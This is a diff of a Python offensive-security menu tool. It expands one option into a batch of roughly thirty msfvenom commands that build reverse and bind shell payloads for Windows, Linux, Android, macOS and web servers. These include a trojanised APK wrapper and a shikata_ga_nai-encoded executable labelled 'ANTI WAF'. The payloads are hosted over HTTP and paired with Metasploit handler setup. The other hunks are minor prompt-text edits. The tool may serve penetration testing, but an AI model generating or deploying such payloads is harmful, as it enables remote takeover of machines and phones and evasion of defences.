@@ -1157,16 +1157,46 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '13':
-      num = input("[*] Please specify listening port :")
+      num = input("[*] Please specify listening port: ")
       
       if num.isdigit():
-         print("[*] Creating exploits please wait...")
-         command("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=" + num + " --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_tcp LHOST="     + localIP + " LPORT=" + num + " --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
-         command("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x64 -f elf -o "   + httpDir + "/linshell64.elf > /dev/null 2>&1")
-         command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="   + localIP + " LPORT=" + num + " --platform linux -a x86 -f elf -o "   + httpDir + "/linshell32.elf > /dev/null 2>&1")
+         print("[*] Creating windows exploits...")         
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + num + " -f exe   -o " + httpDir + "/win_x86_normal_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + num + " -f exe   -o " + httpDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + num + " -f exe   -o " + httpDir + "/win_http_reverse_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + num + " -f exe   -o " + httpDir + "/win_https_reverse_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/windows/reverse_powershell             LHOST=" + localIP + "         LPORT=" + num + "          -o " + httpDir + "/win_powershell.bat > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + num + " -f vba   -o " + httpDir + "/win_macro.vba > arsenal.tmp 2>&1")         
+         command("msfvenom -p windows/meterpreter/reverse_tcp_allports   LHOST=" + localIP + "         LPORT=" + num + " -f exe   -o " + httpDir + "/win_allports_reverse_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + num + " -f exe   -o " + httpDir + "/win_bind_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/shell_hidden_bind_tcp              RHOST=" + TIP.rstrip(" ") + " LPORT=" + num + " -f exe   -o " + httpDir + "/win_bind_hidden_shell.exe > arsenal.tmp 2>&1")
+         print("[*] Creating linux exploits...")
+         command("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + num + " -f elf   -o " + httpDir + "/lin_x86_reverse_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + num + " -f elf   -o " + httpDir + "/lin_x64_reverse_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + num + " -f elf   -o " + httpDir + "/lin_x86_reverse_http_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + num + " -f elf   -o " + httpDir + "/lin_x64_reverse_http_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + num + " -f elf   -o " + httpDir + "/lin_multi_bind_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + num + " -f elf   -o " + httpDir + "/lin_single_bind_shell.elf > arsenal.tmp 2>&1")
+         print("[*] Creating android exploits...")
+         command("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + num + " R        -o " + httpDir + "/android_reverse_shell.apk > arsenal.tmp 2>&1")
+         command("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + num + "          -o " + httpDir + "/android_embed_shell.apk > arsenal.tmp 2>&1")
+         command("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + num + " R        -o " + httpDir + "/android_reverse_http_shell.apk > arsenal.tmp 2>&1")
+         command("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + num + " R        -o " + httpDir + "/android_reverse_https_shell.apk > arsenal.tmp 2>&1")
+         print("[*] Creating mac exploits...")
+         command("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + num + " -f macho -o " + httpDir + "/mac_reverse_shell.macho > arsenal.tmp 2>&1")
+         command("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + num + " -f macho -o " + httpDir + "/mac_bind_shell.macho > arsenal.tmp 2>&1")
+         print("[*] Creating other exploits...")
+         command("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + num + " -f raw    -o " + httpDir + "/web_reverse_shell.php > arsenal.tmp 2>&1")
+         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + num + " -f raw    -o " + httpDir + "/java_reverse_shell.jsp > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + num + " -f asp    -o " + httpDir + "/asp_reverse_shell.asp > arsenal.tmp 2>&1")
+         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + num + " -f war    -o " + httpDir + "/war_reverse_shell.war > arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + num + " -f raw    -o " + httpDir + "/bash_reverse_shell.sh > arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + num + " -f raw    -o " + httpDir + "/python_reverse_shell.py > arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + num + " -f raw    -o " + httpDir + "/perl_reverse_shell.pl > arsenal.tmp 2>&1")
+         # ANTI WAF ----         
+         command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 5 LHOST=" + localIP + " LPORT=" + num + " -f exe -o " + httpDir + "/win_encoded_shell.exe > arsenal.tmp 2>&1")
       else:
-         print("[-] Sorry, I do not understand...")
+         print("[-] Sorry, I did not understand " + num + "...")
 
       prompt()
 
@@ -1179,7 +1209,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      num = input("[*] Please specify listening port :")
+      num = input("[*] Please specify listening port: ")
       
       if num.isdigit():
          print("[*] Starting HTTP server...")
@@ -1190,7 +1220,7 @@ while True:
          command("xdotool type 'python3 -m http.server " + num + "'; xdotool key Return"); time.sleep(1)
          command("xdotool key Ctrl+Tab")      
       else:
-         print("[-] Sorry, I do not understand...")
+         print("[-] Sorry, I did not understand " + num + "...")
       
       prompt()
 
@@ -2717,7 +2747,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='74':    
-      num = input("[*] Please specify listening port :")
+      num = input("[*] Please specify listening port: ")
       
       if num.isdigit():
          print("[*] Creating exploit...")
@@ -2758,7 +2788,7 @@ while True:
    if selection =='75':
       checkParams = testTwo()
       
-      num = input("[*] Please specify listening port :")
+      num = input("[*] Please specify listening port: ")
       
       if num.isdigit():
          if "25" not in POR:
@@ -3115,7 +3145,7 @@ while True:
          if "8080" in POR:
             write.write("set RPORT 8080\n")
          else:
-            num = input("[*] Please specify listening port :")
+            num = input("[*] Please specify listening port: ")
             if num.isdigit():         
                write.write("set RPORT " + num + "\n")
                DATA = PAS.rstrip(" ")
@@ -3155,7 +3185,7 @@ while True:
          write.write("use exploit/multi/handler\n")
          write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
          write.write("set LHOST " + localIP + "\n")
-         num = input("[*] Please specify listening port :")
+         num = input("[*] Please specify listening port: ")
          if num.isdigit():  
             write.write("set LPORT " + num + "\n")
             write.write("clear\n")
